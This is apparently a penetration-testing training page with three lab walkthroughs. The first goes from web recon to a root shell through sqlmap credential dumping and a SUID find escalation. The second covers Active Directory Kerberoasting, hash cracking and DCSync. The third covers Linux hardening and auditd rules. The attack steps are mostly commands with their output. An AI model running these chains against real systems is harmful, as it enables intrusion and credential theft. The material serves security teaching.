HANDS-ON ENGAGEMENT METHODOLOGY

5 Real-World Penetration Testing Walkthroughs

See how tools combine into an authentic end-to-end attack chain. Each scenario walks through an actual engagement phase with expected outputs and practitioner insights.

Scenario 01: Web Recon to Root Shell (Black-Box Compromise) 5 Steps
[1] Network Recon:
$ nmap -sS -sV -sC -T4 10.10.110.45
Found: Port 21 (vsftpd 2.3.4), Port 22 (SSH), Port 80 (Apache 2.4.52).
[2] Web Directory Fuzzing:
$ gobuster dir -u http://10.10.110.45 -w /usr/share/wordlists/dirb/common.txt -x php
Found: /admin (301) and /product.php?id=1 (200).
[3] Database Extraction:
$ sqlmap -u "http://10.10.110.45/product.php?id=1" -D users_production -T accounts --dump
Result: Recovered admin credentials (admin:Password123).
[4] Foothold & PrivEsc:
$ ssh admin@10.10.110.45
$ find / -perm -4000 -type f 2>/dev/null → SUID /usr/bin/find
$ find . -exec /bin/sh -p \; -quit
[+] ROOT ACCESS ACQUIRED: uid=0(root) gid=0(root)
Scenario 02: Active Directory Internal Recon & Kerberoasting 4 Steps
[1] Port Identification:
$ nmap -p 88,135,139,445,389 10.10.10.150
[2] Anonymous SMB Audit:
$ smbclient -L //10.10.10.150/ -N
[3] Kerberos Ticket Extraction (GetUserSPNs):
$ GetUserSPNs.py corp.local/guest:Password@10.10.10.150 -request -outputfile kerberoast.txt
[4] Hash Cracking with Hashcat:
$ hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
[+] Service Account Compromised → DCSync Domain Takeover via secretsdump.py!
Scenario 03: Linux Hardening, Auditd Forensics & Defense 3 Steps
[1] SSH Hardening:
$ sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
$ sudo systemctl restart sshd
[2] Real-time Identity Auditd Rule:
$ sudo auditctl -w /etc/passwd -p wa -k passwd_tamper
$ sudo auditctl -w /etc/shadow -p wa -k shadow_tamper
[3] Host Firewall Strict Filtering:
$ sudo ufw default deny incoming && sudo ufw default allow outgoing
$ sudo ufw allow 22/tcp && sudo ufw enable
